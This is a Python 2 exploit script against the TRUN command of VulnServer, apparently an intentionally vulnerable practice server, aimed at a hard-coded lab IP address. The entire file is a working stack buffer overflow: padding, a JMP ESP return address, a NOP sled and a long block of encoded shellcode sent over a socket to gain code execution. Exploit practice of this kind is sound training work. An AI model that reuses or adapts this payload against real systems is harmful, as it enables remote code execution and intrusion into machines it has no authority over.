#Sam Benoist
#VulnServer Exploit

import socket

ip = "192.168.205.204"
port = 9999
length = 2006

#address of jmp esp on vulnserver
EIP = "\xAF\x11\x50\x62"
nopsled = "\x90"*20

#payload
buf =  ""
buf += "\xda\xc7\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x56\xbb\xbc"
buf += "\xf4\x16\x97\x31\x5d\x18\x83\xed\xfc\x03\x5d\xa8\x16"
buf += "\xe3\x6b\x38\x54\x0c\x94\xb8\x39\x84\x71\x89\x79\xf2"
buf += "\xf2\xb9\x49\x70\x56\x35\x21\xd4\x43\xce\x47\xf1\x64"
buf += "\x67\xed\x27\x4a\x78\x5e\x1b\xcd\xfa\x9d\x48\x2d\xc3"
buf += "\x6d\x9d\x2c\x04\x93\x6c\x7c\xdd\xdf\xc3\x91\x6a\x95"
buf += "\xdf\x1a\x20\x3b\x58\xfe\xf0\x3a\x49\x51\x8b\x64\x49"
buf += "\x53\x58\x1d\xc0\x4b\xbd\x18\x9a\xe0\x75\xd6\x1d\x21"
buf += "\x44\x17\xb1\x0c\x69\xea\xcb\x49\x4d\x15\xbe\xa3\xae"
buf += "\xa8\xb9\x77\xcd\x76\x4f\x6c\x75\xfc\xf7\x48\x84\xd1"
buf += "\x6e\x1a\x8a\x9e\xe5\x44\x8e\x21\x29\xff\xaa\xaa\xcc"
buf += "\xd0\x3b\xe8\xea\xf4\x60\xaa\x93\xad\xcc\x1d\xab\xae"
buf += "\xaf\xc2\x09\xa4\x5d\x16\x20\xe7\x09\xdb\x09\x18\xc9"
buf += "\x73\x19\x6b\xfb\xdc\xb1\xe3\xb7\x95\x1f\xf3\xce\xb2"
buf += "\x9f\x2b\x68\xd2\x61\xcc\x88\xfa\xa5\x98\xd8\x94\x0c"
buf += "\xa1\xb3\x64\xb0\x74\x29\x6f\x26\xb7\x05\xa2\xde\x5f"
buf += "\x57\x3d\x0e\xfc\xde\xdb\x60\xac\xb0\x73\xc1\x1c\x70"
buf += "\x24\xa9\x76\x7f\x1b\xc9\x78\xaa\x34\x60\x97\x02\x6c"
buf += "\x1d\x0e\x0f\xe6\xbc\xcf\x9a\x82\xff\x44\x2e\x72\xb1"
buf += "\xac\x5b\x60\xa6\xca\xa3\x78\x37\x7f\xa3\x12\x33\x29"
buf += "\xf4\x8a\x39\x0c\x32\x15\xc1\x7b\x41\x52\x3d\xfa\x73"
buf += "\x28\x08\x68\x3b\x46\x75\x7c\xbb\x96\x23\x16\xbb\xfe"
buf += "\x93\x42\xe8\x1b\xdc\x5e\x9d\xb7\x49\x61\xf7\x64\xd9"
buf += "\x09\xf5\x53\x2d\x96\x06\xb6\x2d\xd1\xf8\x44\x1a\x7a"
buf += "\x90\xb6\x1a\x7a\x60\xdd\x9a\x2a\x08\x2a\xb4\xc5\xf8"
buf += "\xd3\x1f\x8e\x90\x5e\xce\x7c\x01\x5e\xdb\x21\x9f\x5f"
buf += "\xe8\xf9\x10\x25\x81\xfe\xd1\xda\x8b\x9a\xd2\xda\xb3"
buf += "\x9c\xef\x0c\x8a\xea\x2e\x8d\xa9\xe5\x05\xb0\x98\x6f"
buf += "\x65\xe6\xdb\xa5"

try:
	sock = socket.socket()
	sock.settimeout(3)
	sock.connect((ip, port))
	print sock.recv(1024)

	bad_string = "TRUN ." + "A"*length + EIP + nopsled + buf
	sock.send(bad_string)
	print sock.recv(1024)
	sock.close()
except:
	print "Something broke"
	print length

